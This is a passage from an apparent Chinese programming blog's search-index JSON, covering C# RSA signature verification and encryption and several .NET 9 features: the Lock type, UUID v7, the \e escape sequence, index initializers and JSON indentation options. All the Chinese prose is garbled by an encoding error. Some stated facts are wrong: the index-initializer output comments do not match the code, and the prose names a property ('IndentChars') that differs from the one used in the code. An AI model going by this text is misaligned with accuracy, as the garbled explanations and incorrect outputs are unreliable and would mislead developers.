è¾“ï¼Œä»¥åŠå¯¹ç­¾åçš„éªŒè¯è¿‡ç¨‹ï¼Œä»¥ç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’Œæ¥æºçš„çœŸå®æ€§ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç­¾åéªŒè¯ç¤ºä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334using System;using System.Security.Cryptography;using System.Text;class SignatureVerification&#123; static void Main(string[] args) &#123; string data = &quot;Hello, World!&quot;; string publicKey = &quot;your_public_key_here&quot;; string signatureBase64 = &quot;your_signature_here&quot;; try &#123; bool isValid = VerifySignature(data, signatureBase64, publicKey); Console.WriteLine($&quot;Signature is valid: &#123;isValid&#125;&quot;); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error during verification: &#123;ex.Message&#125;&quot;); &#125; &#125; static bool VerifySignature(string data, string signatureBase64, string publicKey) &#123; byte[] dataBytes = Encoding.UTF8.GetBytes(data); byte[] signatureBytes = Convert.FromBase64String(signatureBase64); byte[] publicKeyBytes = Convert.FromBase64String(publicKey); using (RSA rsa = RSA.Create()) &#123; rsa.ImportRSAPublicKey(publicKeyBytes, out _); return rsa.VerifyData(dataBytes, signatureBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); &#125; &#125;&#125; dataï¼šåŸå§‹æ•°æ®ï¼Œç”¨äºéªŒè¯ç­¾åæ˜¯å¦æ˜¯å¯¹è¯¥æ•°æ®çš„ç­¾åã€‚signatureBase64ï¼šéœ€è¦éªŒè¯çš„ç­¾åï¼Œä»¥ Base64 ç¼–ç çš„å­—ç¬¦ä¸²å½¢å¼æä¾›ã€‚publicKeyï¼šç”¨äºéªŒè¯ç­¾åçš„å…¬é’¥ï¼Œä»¥ Base64 ç¼–ç çš„å­—ç¬¦ä¸²å½¢å¼æä¾›ã€‚VerifySignature å‡½æ•°ï¼šbyte[] dataBytes &#x3D; Encoding.UTF8.GetBytes(data);ï¼šå°†åŸå§‹æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ã€‚byte[] signatureBytes &#x3D; Convert.FromBase64String(signatureBase64);ï¼šå°† Base64 ç¼–ç çš„ç­¾åè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ã€‚byte[] publicKeyBytes &#x3D; Convert.FromBase64String(publicKey);ï¼šå°† Base64 ç¼–ç çš„å…¬é’¥è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ã€‚using (RSA rsa &#x3D; RSA.Create())ï¼šåˆ›å»ºä¸€ä¸ª RSA ç®—æ³•çš„å®ä¾‹ã€‚rsa.ImportRSAPublicKey(publicKeyBytes, out _);ï¼šå°†å…¬é’¥å¯¼å…¥ RSA ç®—æ³•å®ä¾‹ã€‚return rsa.VerifyData(dataBytes, signatureBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);ï¼šä½¿ç”¨å…¬é’¥éªŒè¯ç­¾åã€‚dataBytesï¼šåŸå§‹æ•°æ®çš„å­—èŠ‚è¡¨ç¤ºã€‚signatureBytesï¼šè¦éªŒè¯çš„ç­¾åçš„å­—èŠ‚è¡¨ç¤ºã€‚HashAlgorithmName.SHA256ï¼šä½¿ç”¨ SHA256 å“ˆå¸Œç®—æ³•ï¼Œä¸ç­¾åæ—¶ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ä¿æŒä¸€è‡´ã€‚RSASignaturePadding.Pkcs1ï¼šä½¿ç”¨ PKCS #1 ç­¾åå¡«å……æ–¹æ¡ˆï¼Œä¸ç­¾åæ—¶ä½¿ç”¨çš„å¡«å……æ–¹æ¡ˆä¿æŒä¸€è‡´ã€‚ ä½¿ç”¨è¯´æ˜ï¼šå°† your_public_key_here æ›¿æ¢ä¸ºè‡ªå·±çš„ RSA å…¬é’¥ã€‚å°† your_signature_here æ›¿æ¢ä¸ºè¦éªŒè¯çš„ç­¾åã€‚ç¨‹åºå°†å¯¹ç­¾åè¿›è¡ŒéªŒè¯ï¼Œå¹¶è¾“å‡ºéªŒè¯ç»“æœã€‚è¿è¡Œç¨‹åºï¼Œå¦‚æœç­¾åæœ‰æ•ˆï¼Œå°†è¾“å‡º Signature is valid: trueï¼›å¦åˆ™ï¼Œå°†è¾“å‡º Signature is valid: false æˆ–é”™è¯¯æ¶ˆæ¯ã€‚ç¡®ä¿å…¬é’¥å’Œç­¾åçš„å®Œæ•´æ€§ï¼Œä»¥åŠä½¿ç”¨ä¸ç­¾åæ—¶ç›¸åŒçš„å“ˆå¸Œç®—æ³•å’Œå¡«å……æ–¹æ¡ˆï¼Œè¿™æ ·æ‰èƒ½æ­£ç¡®éªŒè¯ç­¾åçš„æœ‰æ•ˆæ€§ã€‚ å…¬é’¥åŠ å¯† ç§é’¥è§£å¯†ç§é’¥ç­¾å å…¬é’¥éªŒè¯ TEST123456789101112131415161718192021222324252627282930313233343536373839404142434445string originalText = &quot;Hello, World!&quot;;// åˆ›å»º RSA ç®—æ³•å®ä¾‹using (RSA rsa = RSA.Create())&#123; // å¯¼å‡ºå…¬é’¥ string publicKey = Convert.ToBase64String(rsa.ExportRSAPublicKey()); // å¯¼å‡ºç§é’¥ string privateKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey()); Console.WriteLine(&quot;publicKey \\n&quot; + publicKey + &quot;\\n&quot;); Console.WriteLine(&quot;priKey &quot; + privateKey + &quot;\\n&quot;); string key1 = &quot;MxBase64&quot;; string sclientstr = &quot;aIQ==&quot;; string key2 = &quot;MIB64Cv+&quot;; // åŠ å¯† byte[] encryptedBytes = RSAHelper.RSAEncrypt(originalText, publicKey); string encryptedText = Convert.ToBase64String(encryptedBytes); Console.WriteLine($&quot;Encrypted Text: &#123;encryptedText&#125;&quot;); // è§£å¯† string decryptedText = RSAHelper.RSADecrypt(encryptedBytes, privateKey); Console.WriteLine($&quot;Decrypted Text: &#123;decryptedText&#125;&quot;); // è§£å¯†2 string decryptedText2 = RSAHelper.RSADecryptS(sclientstr, key2); Console.WriteLine($&quot;Decrypted Text2: &#123;decryptedText2&#125;&quot;); // //key string keyim = ConfigManager.Temp1; //aes åŠ å¯† string encrypted = Aesv1.Encrypt(&quot;1234567890A2&quot;, keyim);// decryptedText2);//keyim Console.WriteLine($&quot;encrypted &#123;encrypted&#125;&quot;); //byte[] encrypted2 = RSAHelper.RSAEncrypt(&quot;1234567890A2&quot;, decryptedText2); //string encryptedText2 = Convert.ToBase64String(encrypted2);// //Console.WriteLine($&quot;encrypted2 &#123;encryptedText2&#125;&quot;); //ç­¾å string signStr = RSAHelper.RSASignDataS(encrypted, key2); Console.WriteLine(&quot;encrypted 1111111111111 &quot;+ signStr);&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"ras","slug":"ras","permalink":"https://banjinmei.github.io/tags/ras/"}],"author":"mu"},{"title":".NET9 lock Aspire UUID JsonSerializerOptions","slug":"NET9-lock-Aspire-UUID-JsonSerializerOptions","date":"2025-01-01T16:05:49.000Z","updated":"2025-01-01T16:12:10.880Z","comments":true,"path":"2025/01/02/NET9-lock-Aspire-UUID-JsonSerializerOptions/","permalink":"https://banjinmei.github.io/2025/01/02/NET9-lock-Aspire-UUID-JsonSerializerOptions/","excerpt":"","text":".NET9è¿„ä»Šä¸ºæ­¢æœ€é«˜æ•ˆã€æœ€ç°ä»£ã€æœ€å®‰å…¨ã€æœ€æ™ºèƒ½ã€æ€§èƒ½æœ€é«˜çš„.NETç‰ˆæœ¬ 12dotnet --list-sdks# æŒ‡ä»¤æŸ¥çœ‹æ˜¯å¦ä»¥å®‰è£….NET9ã€‚ ä¸‹è½½.NET9 SDKå®‰è£… or IDE Visual Studio æ›´æ–° Lockå¼•å…¥ System.Threading.Lock æ˜¯ .NET æä¾›çš„ä¸€ä¸ªæ›´ä¼˜é›…çš„é”å®šæœºåˆ¶ï¼Œå¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„åŸºäº Monitor çš„é”å®šæ–¹å¼ã€‚ä»¥ä¸‹æ˜¯æ–°é”å®šæœºåˆ¶çš„ç‰¹ç‚¹åŠç¤ºä¾‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738using System;using System.Threading;class Program&#123; private static readonly Lock _lock = new(); static void Main() &#123; // ä½¿ç”¨æ–°é”å®šæœºåˆ¶ using (_lock.EnterScope()) &#123; Console.WriteLine(&quot;è¿™æ˜¯çº¿ç¨‹å®‰å…¨çš„ä»£ç å—&quot;); // åœ¨è¿™é‡Œæ‰§è¡Œçº¿ç¨‹å®‰å…¨çš„æ“ä½œ &#125; // æ¼”ç¤ºå¤šçº¿ç¨‹åœºæ™¯ Thread thread1 = new(() =&gt; AccessResource(&quot;çº¿ç¨‹1&quot;)); Thread thread2 = new(() =&gt; AccessResource(&quot;çº¿ç¨‹2&quot;)); thread1.Start(); thread2.Start(); thread1.Join(); thread2.Join(); &#125; static void AccessResource(string threadName) &#123; using (_lock.EnterScope()) &#123; Console.WriteLine($&quot;&#123;threadName&#125; æ­£åœ¨è®¿é—®å…±äº«èµ„æº...&quot;); Thread.Sleep(1000); // æ¨¡æ‹Ÿä¸€äº›æ“ä½œ Console.WriteLine($&quot;&#123;threadName&#125; å®Œæˆè®¿é—®&quot;); &#125; &#125;&#125; å®šä¹‰é”å¯¹è±¡ï¼š 1private static readonly Lock _lock = new(); Lock ç±»å‹ä¸“é—¨ç”¨äºå®ç°é”å®šï¼Œæ¯” object æ›´æ¸…æ™°å’Œå®‰å…¨ã€‚è¿›å…¥é”å®šèŒƒå›´ï¼šusing (_lock.EnterScope())EnterScope è¿”å›ä¸€ä¸ª ref structï¼Œå®ƒåœ¨ç¦»å¼€ä½œç”¨åŸŸæ—¶è‡ªåŠ¨é‡Šæ”¾é”ã€‚å¤šçº¿ç¨‹åœºæ™¯ï¼šå¤šä¸ªçº¿ç¨‹å°è¯•è®¿é—®å…±äº«èµ„æºï¼Œé€šè¿‡ using ç¡®ä¿ä»£ç å—æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ä¼˜åŠ¿é¿å…ä¼ ç»Ÿ Monitor.Enter å’Œ Monitor.Exit çš„ç¹çä»£ç åŠæ½œåœ¨çš„é”™è¯¯ã€‚è‡ªåŠ¨é‡Šæ”¾é”ï¼Œå‡å°‘èµ„æºæ³„æ¼çš„é£é™©ã€‚ç±»å‹å®‰å…¨çš„è®¾è®¡é¿å…äº†åœ¨å¼‚æ­¥åœºæ™¯ä¸­çš„è¯¯ç”¨ã€‚æ³¨æ„äº‹é¡¹Lock.EnterScope è¿”å› ref structï¼Œå› æ­¤å®ƒä¸èƒ½è¢«æ•è·æˆ–åœ¨å¼‚æ­¥æ–¹æ³•ä¸­ä½¿ç”¨ã€‚Lock æ˜¯ä¸å¯å¤åˆ¶çš„ï¼Œç¡®ä¿é”çš„ç‹¬å æ€§å’Œå®‰å…¨æ€§ã€‚è¿™æ˜¯ä¸€ä¸ªæ›´ç°ä»£åŒ–çš„çº¿ç¨‹åŒæ­¥æ–¹å¼ï¼Œéå¸¸é€‚åˆåœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚ æ›´å®‰å…¨ã€æ›´é«˜æ•ˆã€‚ å¯ä»¥å’Œusingä¸€èµ·ä½¿ç”¨ .NET Aspire - Blazor Web Web APIå¯ä»¥é€‰æ‹©ä½¿ç”¨ Redis è¿›è¡Œç¼“å­˜ æµ‹è¯•é¡¹ç›® https://learn.microsoft.com/zh-cn/dotnet/aspire/https://github.com/communitytoolkit/aspirehttps://learn.microsoft.com/zh-cn/dotnet/aspire/whats-new/dotnet-aspire-9?tabs=windows å¯¹æ¯”.NET8 ,.NET9 å¤šäº† vue recat angular webé¡¹ç›® UUID v7æˆ‘ä»¬ç»å¸¸åœ¨å®ä½“ä¸­ä½¿ç”¨Guidä½œä¸ºä¸»é”®ï¼Œå¹¶ä¸”é€šè¿‡Guid.NewGuid()å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç”Ÿæˆä¸€ä¸ªæ–°çš„Guidï¼Œè€Œæ­¤æ–¹æ³•ç”Ÿæˆçš„Guidæ˜¯ä¾æ®UUIDç¬¬å››ä¸ªç‰ˆæœ¬è§„èŒƒç”Ÿæˆçš„ã€‚ å½“å‰å·²ç»å¯ä»¥é€šè¿‡Guid.CreateVersion7()æ–¹æ³•åˆ›å»ºUUIDç¬¬ä¸ƒä¸ªç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬UUIDä¸»è¦åŠŸèƒ½å°±æ˜¯åŒ…å«äº†æ—¶é—´æˆ³ï¼Œæ•°æ®ç»“æ„å¦‚ä¸‹ï¼š | 48ä½æ—¶é—´æˆ³ | 12ä½éšæœº | 62ä½éšæœº | è¿™ä¹Ÿæ„å‘³ç€v7ç‰ˆæœ¬çš„UUIDå¯ä»¥æŒ‰æ—¶é—´æ’åºäº†ï¼Œåœ¨æ•°æ®åº“ä¸­ä½¿ç”¨èµ·æ¥æ›´æ–¹ä¾¿ï¼ŒåŒæ—¶Guid.CreateVersion7()æ–¹æ³•è¿˜æœ‰ä¸€ä¸ªé‡è½½æ–¹æ³•æ¥æ”¶DateTimeOffsetç±»å‹æ—¶é—´æˆ³ï¼Œç”¨æ¥é€šè¿‡æŒ‡å®šæ—¶é—´åˆ›å»ºUUIDã€‚ 12345678910// v4 UUIDvar guid_v4 = Guid.NewGuid();// v7 UUIDvar guid_v7 = Guid.CreateVersion7();// v7 UUID with timestampvar guid_v7_time = Guid.CreateVersion7(TimeProvider.System.GetLocalNow());Console.WriteLine(guid_v4);Console.WriteLine(guid_v7);Console.WriteLine(guid_v7_time); \\eåœ¨ C# ä¸­ï¼Œéšç€æ–°çš„è½¬ä¹‰åºåˆ— \\e çš„å¼•å…¥ï¼Œå¼€å‘è€…å¯ä»¥æ›´æ–¹ä¾¿åœ°è¡¨ç¤º Unicode å­—ç¬¦ U+001B (ESCAPE å­—ç¬¦)ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ä»£ç ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨æ–°çš„è½¬ä¹‰åºåˆ— \\e å’Œä¼ ç»Ÿæ–¹å¼çš„åŒºåˆ«ã€‚ 12345678910111213141516171819202122232425262728using System;class Program&#123; static void Main() &#123; // ä½¿ç”¨æ–°çš„è½¬ä¹‰åºåˆ— \\e string newEscapeSequence = &quot;\\e[31mHello, World!\\e[0m&quot;; // ANSI è½¬ä¹‰ä»£ç ï¼šçº¢è‰²æ–‡æœ¬ Console.WriteLine(&quot;Using \\\\e:&quot;); Console.WriteLine(newEscapeSequence); // ä½¿ç”¨æ—§çš„æ–¹å¼ \\u001b string oldUnicodeEscape = &quot;\\u001b[31mHello, World!\\u001b[0m&quot;; // ANSI è½¬ä¹‰ä»£ç ï¼šçº¢è‰²æ–‡æœ¬ Console.WriteLine(&quot;Using \\\\u001b:&quot;); Console.WriteLine(oldUnicodeEscape); // ä½¿ç”¨æ—§çš„æ–¹å¼ \\x1b string oldHexEscape = &quot;\\x1b[31mHello, World!\\x1b[0m&quot;; // ANSI è½¬ä¹‰ä»£ç ï¼šçº¢è‰²æ–‡æœ¬ Console.WriteLine(&quot;Using \\\\x1b:&quot;); Console.WriteLine(oldHexEscape); // æ³¨æ„ï¼š\\x1b åå¯èƒ½æ„å¤–åŒ…å«åç»­çš„æœ‰æ•ˆåå…­è¿›åˆ¶å­—ç¬¦ string potentialIssue = &quot;\\x1b7Hello&quot;; // å¯èƒ½è¢«è§£æä¸º \\x1b7 è€Œä¸æ˜¯å•ç‹¬çš„ \\x1b Console.WriteLine(&quot;Potential issue with \\\\x1b:&quot;); Console.WriteLine(potentialIssue); &#125;&#125; æ¨èä½¿ç”¨ \\eï¼šå®ƒæ›´ç®€æ´å¹¶ä¸”æ²¡æœ‰å¯èƒ½çš„æ­§ä¹‰ã€‚é¿å…ä½¿ç”¨ \\x1bï¼šå¦‚æœåç»­å­—ç¬¦æ˜¯åå…­è¿›åˆ¶æ•°å­—ï¼Œå¯èƒ½å¯¼è‡´æ„å¤–ç»“æœã€‚ä¾‹å¦‚ï¼Œ\\x1b7 ä¼šè¢«è§£æä¸ºä¸€ä¸ªå­—ç¬¦ï¼Œè€Œä¸æ˜¯ ESC å­—ç¬¦åè·Ÿ 7ã€‚å‘åå…¼å®¹ï¼šC# ä»ç„¶æ”¯æŒ \\u001b å’Œ \\x1bï¼Œä½†å»ºè®®é€æ­¥è¿ç§»åˆ° \\eã€‚æ–°çš„è½¬ä¹‰åºåˆ— \\e æé«˜äº†ä»£ç å¯è¯»æ€§å’Œå®‰å…¨æ€§ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç† ANSI è½¬ä¹‰åºåˆ—æ—¶ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›æ›´ä¸°å¯Œçš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨æ–°çš„ \\e è½¬ä¹‰åºåˆ—ï¼Œä»¥åŠå¦‚ä½•åœ¨å„ç§åœºæ™¯ä¸­æ›¿ä»£æ—§çš„æ–¹å¼ã€‚ ç¤ºä¾‹ 1: æ§åˆ¶å°ä¸­çš„é¢œè‰²åˆ‡æ¢1234567891011121314151617using System;class Program&#123; static void Main() &#123; // ä½¿ç”¨ \\e è½¬ä¹‰åºåˆ—æ¥æ”¹å˜æ–‡å­—é¢œè‰² string redText = &quot;\\e[31mThis is red text\\e[0m&quot;; // çº¢è‰²æ–‡æœ¬ string greenText = &quot;\\e[32mThis is green text\\e[0m&quot;; // ç»¿è‰²æ–‡æœ¬ string yellowText = &quot;\\e[33mThis is yellow text\\e[0m&quot;; // é»„è‰²æ–‡æœ¬ Console.WriteLine(redText); Console.WriteLine(greenText); Console.WriteLine(yellowText); &#125;&#125; ç¤ºä¾‹ 2: å¸¦æœ‰å…‰æ ‡ç§»åŠ¨çš„æ§åˆ¶å°è¾“å‡º123456789101112131415161718using System;class Program&#123; static void Main() &#123; // ä½¿ç”¨ \\e æ¥æ§åˆ¶å…‰æ ‡ä½ç½® string moveCursorUp = &quot;\\e[1A&quot;; // å…‰æ ‡ä¸Šç§» 1 è¡Œ string moveCursorDown = &quot;\\e[1B&quot;; // å…‰æ ‡ä¸‹ç§» 1 è¡Œ string moveCursorRight = &quot;\\e[10C&quot;; // å…‰æ ‡å³ç§» 10 åˆ— Console.WriteLine(&quot;Line 1&quot;); Console.WriteLine(&quot;Line 2&quot;); Console.WriteLine(moveCursorUp + &quot;Moved Up&quot;); Console.WriteLine(moveCursorRight + &quot;Moved Right&quot;); &#125;&#125; ç¤ºä¾‹ 3: æ ¼å¼åŒ–å¤šç§æ ·å¼1234567891011121314151617using System;class Program&#123; static void Main() &#123; // ä½¿ç”¨ ANSI è½¬ä¹‰åºåˆ—æ¥æ··åˆæ ·å¼ string boldAndRed = &quot;\\e[1;31mBold and Red Text\\e[0m&quot;; // ç²—ä½“ + çº¢è‰² string underlineAndGreen = &quot;\\e[4;32mUnderline and Green Text\\e[0m&quot;; // ä¸‹åˆ’çº¿ + ç»¿è‰² string inverted = &quot;\\e[7mInverted Colors\\e[0m&quot;; // åè½¬é¢œè‰² Console.WriteLine(boldAndRed); Console.WriteLine(underlineAndGreen); Console.WriteLine(inverted); &#125;&#125; ç¤ºä¾‹ 4: æ¸…å±å’Œéšè—å…‰æ ‡123456789101112131415161718192021using System;class Program&#123; static void Main() &#123; // ä½¿ç”¨ \\e æ§åˆ¶æ§åˆ¶å°æ¸…å±å’Œéšè—å…‰æ ‡ string clearScreen = &quot;\\e[2J&quot;; // æ¸…å± string hideCursor = &quot;\\e[?25l&quot;; // éšè—å…‰æ ‡ string showCursor = &quot;\\e[?25h&quot;; // æ˜¾ç¤ºå…‰æ ‡ Console.WriteLine(&quot;This will be cleared...&quot;); Console.WriteLine(clearScreen + &quot;Screen Cleared!&quot;); Console.WriteLine(hideCursor + &quot;Cursor Hidden!&quot;); Console.WriteLine(&quot;Press Enter to show cursor again...&quot;); Console.ReadLine(); Console.WriteLine(showCursor + &quot;Cursor Visible!&quot;); &#125;&#125; ç¤ºä¾‹ 5: åŠ¨æ€åŠ è½½è¿›åº¦æ¡123456789101112131415161718192021using System;using System.Threading;class Program&#123; static void Main() &#123; string progressBarTemplate = &quot;\\e[32m[####################]\\e[0m&quot;; string clearLine = &quot;\\e[2K\\r&quot;; for (int i = 0; i &lt;= 20; i++) &#123; string progress = new string(&#x27;#&#x27;, i) + new string(&#x27; &#x27;, 20 - i); Console.Write(clearLine + $&quot;\\e[32m[&#123;progress&#125;]\\e[0m &#123;i * 5&#125;%&quot;); Thread.Sleep(200); // æ¨¡æ‹Ÿä»»åŠ¡å¤„ç†æ—¶é—´ &#125; Console.WriteLine(&quot;\\nDone!&quot;); &#125;&#125; ç¤ºä¾‹æ€»ç»“é¢œè‰²ï¼šç”¨ \\e å®šä¹‰é¢œè‰²æ–‡æœ¬éå¸¸æ–¹ä¾¿ã€‚å…‰æ ‡æ§åˆ¶ï¼š\\e å¯ç”¨æ¥å®ç°å…‰æ ‡çš„ç§»åŠ¨ã€éšè—å’Œæ˜¾ç¤ºã€‚æ··åˆæ ·å¼ï¼šæ”¯æŒå¤šç§æ ·å¼ç»„åˆï¼Œæ¯”å¦‚ç²—ä½“ã€ä¸‹åˆ’çº¿å’Œé¢œè‰²ã€‚å±å¹•æ“ä½œï¼šæ¸…å±ã€éšè—å…‰æ ‡ç­‰åŠŸèƒ½å¤§å¹…æé«˜äº†ç»ˆç«¯äº¤äº’çš„çµæ´»æ€§ã€‚åŠ¨æ€æ•ˆæœï¼šç”¨ \\e åˆ›å»ºè¿›åº¦æ¡ã€åŠ¨æ€è¾“å‡ºç­‰éå¸¸ç›´è§‚ã€‚ ç´¢å¼•è¿ç®—ç¬¦ éšå¼â€œä»æœ«å°¾å¼€å§‹â€ç´¢å¼•è¿ç®—ç¬¦ ^ï¼Œéœ€è¦æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œã€‚ä»¥ä¸‹æ˜¯å®Œæ•´çš„ç”¨æ³•æŒ‡å—ï¼š å‰ç½®æ¡ä»¶ç¯å¢ƒè¦æ±‚ï¼šC# 8.0 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚.NET Core 3.0 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œæˆ– .NET Framework æ”¯æŒçš„ç‰ˆæœ¬ã€‚buffer å±æ€§è¦æ±‚ï¼šbuffer å¿…é¡»æ˜¯æ”¯æŒç´¢å¼•å™¨çš„ç±»å‹ï¼Œä¾‹å¦‚æ•°ç»„ (T[])ã€åˆ—è¡¨ (List) æˆ–å…¶ä»–å®ç°äº† IList çš„é›†åˆç±»å‹ã€‚ ä»£ç ç¤ºä¾‹1. ä½¿ç”¨æ•°ç»„1234567891011121314151617181920212223242526272829using System;class S&#123; public int[] buffer = new int[10]; // å®šä¹‰ä¸€ä¸ªå¤§å°ä¸º10çš„æ•°ç»„&#125;class Program&#123; static void Main() &#123; var v = new S() &#123; buffer = &#123; [^1] = 0, // å€’æ•°ç¬¬1ä¸ªå…ƒç´ è®¾ç½®ä¸º 0 [^2] = 1, // å€’æ•°ç¬¬2ä¸ªå…ƒç´ è®¾ç½®ä¸º 1 [^3] = 2, // å€’æ•°ç¬¬3ä¸ªå…ƒç´ è®¾ç½®ä¸º 2 [^4] = 3, // å€’æ•°ç¬¬4ä¸ªå…ƒç´ è®¾ç½®ä¸º 3 [^5] = 4 // å€’æ•°ç¬¬5ä¸ªå…ƒç´ è®¾ç½®ä¸º 4 &#125; &#125;; // è¾“å‡ºç»“æœ Console.WriteLine(string.Join(&quot;, &quot;, v.buffer)); // è¾“å‡º: 0, 0, 0, 0, 4, 3, 2, 1, 0, 0 &#125;&#125; 2. ä½¿ç”¨ Listå¦‚æœ buffer æ˜¯ä¸€ä¸ª Listï¼Œå¯ä»¥è¿™æ ·åˆå§‹åŒ–ï¼š 123456789101112131415161718192021222324252627282930using System;using System.Collections.Generic;class S&#123; public List&lt;int&gt; buffer = new List&lt;int&gt;(new int[10]); // åˆå§‹åŒ–ä¸º10ä¸ªå…ƒç´ &#125;class Program&#123; static void Main() &#123; var v = new S() &#123; buffer = &#123; [^1] = 0, [^2] = 1, [^3] = 2, [^4] = 3, [^5] = 4 &#125; &#125;; // è¾“å‡ºç»“æœ Console.WriteLine(string.Join(&quot;, &quot;, v.buffer)); // è¾“å‡º: 0, 0, 0, 0, 4, 3, 2, 1, 0, 0 &#125;&#125; JSONJsonSerializerOptions ç¼©è¿›é€‰é¡¹ ï¼Œå¯æ”¯æŒè‡ªå®šä¹‰å†™å…¥ JSON çš„ç¼©è¿›å­—ç¬¦å’Œç¼©è¿›å¤§å°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748var options = new JsonSerializerOptions&#123; WriteIndented = true, IndentCharacter = &#x27;\\t&#x27;, IndentSize = 2,&#125;;string json = JsonSerializer.Serialize( new &#123; Value = 1 &#125;, options );Console.WriteLine(json);var data = new&#123; Name = &quot;Alice&quot;, Age = 30, Skills = new[] &#123; &quot;C#&quot;, &quot;ASP.NET Core&quot;, &quot;Blazor&quot; &#125;&#125;;// é»˜è®¤ç¼©è¿›æ ¼å¼var defaultOptions = new JsonSerializerOptions&#123; WriteIndented = true&#125;;Console.WriteLine(&quot;é»˜è®¤æ ¼å¼:&quot;);Console.WriteLine(JsonSerializer.Serialize(data, defaultOptions));// ä½¿ç”¨è‡ªå®šä¹‰ç¼©è¿›å­—ç¬¦ï¼ˆåˆ¶è¡¨ç¬¦ï¼‰å’Œå¤§å°var customOptions = new JsonSerializerOptions&#123; WriteIndented = true, IndentCharacter = &#x27;\\t&#x27;, // ä½¿ç”¨åˆ¶è¡¨ç¬¦ IndentSize = 1 // æ¯å±‚ç¼©è¿› 1 ä¸ªåˆ¶è¡¨ç¬¦&#125;;Console.WriteLine(&quot;\\nè‡ªå®šä¹‰åˆ¶è¡¨ç¬¦ç¼©è¿›:&quot;);Console.WriteLine(JsonSerializer.Serialize(data, customOptions));// ä½¿ç”¨è‡ªå®šä¹‰ç©ºæ ¼ç¼©è¿›var customSpaceOptions = new JsonSerializerOptions&#123; WriteIndented = true, IndentCharacter = &#x27; &#x27;, // ä½¿ç”¨ç©ºæ ¼ IndentSize = 4 // æ¯å±‚ç¼©è¿› 4 ä¸ªç©ºæ ¼&#125;;Console.WriteLine(&quot;\\nè‡ªå®šä¹‰ç©ºæ ¼ç¼©è¿›:&quot;);Console.WriteLine(JsonSerializer.Serialize(data, customSpaceOptions)); ç»“æœ{ â€œValueâ€: 1}é»˜è®¤æ ¼å¼:{ â€œNameâ€: â€œAliceâ€, â€œAgeâ€: 30, â€œSkillsâ€: [ â€œC#â€, â€œASP.NET Coreâ€, â€œBlazorâ€ ]} è‡ªå®šä¹‰åˆ¶è¡¨ç¬¦ç¼©è¿›:{ â€œNameâ€: â€œAliceâ€, â€œAgeâ€: 30, â€œSkillsâ€: [ â€œC#â€, â€œASP.NET Coreâ€, â€œBlazorâ€ ]} è‡ªå®šä¹‰ç©ºæ ¼ç¼©è¿›:{ â€œNameâ€: â€œAliceâ€, â€œAgeâ€: 30, â€œSkillsâ€: [ â€œC#â€, â€œASP.NET Coreâ€, â€œBlazorâ€ ]} JsonSerializerOptionsæ–°å¢äº†å¯¹è‡ªå®šä¹‰ JSON ç¼©è¿›å­—ç¬¦å’Œç¼©è¿›å¤§å°çš„æ”¯æŒã€‚è¿™é¡¹ç‰¹æ€§ä¸»è¦é€šè¿‡ä¸¤ä¸ªæ–°å±æ€§å®ç°ï¼š IndentChars: æŒ‡å®šç”¨äºç¼©è¿›çš„å­—ç¬¦ï¼ˆé»˜è®¤ä¸ºç©ºæ ¼ â€œ â€œï¼‰ã€‚IndentSize: æŒ‡å®šç¼©è¿›çš„å¤§å°ï¼ˆé»˜è®¤ä¸º 2ï¼‰ã€‚è¿™äº›å±æ€§è®©å¼€å‘è€…çµæ´»æ§åˆ¶ JSON æ ¼å¼ï¼Œé€‚é…ä¸åŒéœ€æ±‚ï¼š æ—¥å¿—ä¼˜åŒ–: æé«˜å¯è¯»æ€§ï¼Œä¾¿äºç»“æ„å®šä½ã€‚å‰ç«¯é€‚é…: ç¬¦åˆæ¡†æ¶ç¼©è¿›è¦æ±‚ã€‚ç©ºé—´èŠ‚çº¦: å‡å°‘ JSON ä½“ç§¯ã€‚å·¥å…·å…¼å®¹: æ»¡è¶³å¤–éƒ¨æ ¼å¼è¦æ±‚ã€‚ JsonSerializerOptions.Webæ˜¯ä¸€ä¸ªæ–°çš„å•ä¾‹å®ä¾‹ï¼Œä¸“ä¸º Web åº”ç”¨ç¨‹åºè®¾è®¡ï¼Œæä¾›äº†é»˜è®¤çš„ JSON åºåˆ—åŒ–é€‰é¡¹ã€‚å®ƒçš„ä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ï¼š å±æ€§å‘½åç­–ç•¥ï¼šå°†å±æ€§åç§°ä» PascalCase è½¬æ¢ä¸º camelCaseï¼Œä»¥ç¬¦åˆ JavaScript çš„å‘½åæƒ¯ä¾‹ã€‚ å¿½ç•¥é»˜è®¤å€¼ï¼šåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¿½ç•¥å±æ€§çš„é»˜è®¤å€¼ï¼ˆå¦‚ nullã€0ã€falseï¼‰ï¼Œä»¥å‡å°‘ä¼ è¾“çš„æ•°æ®é‡ã€‚ 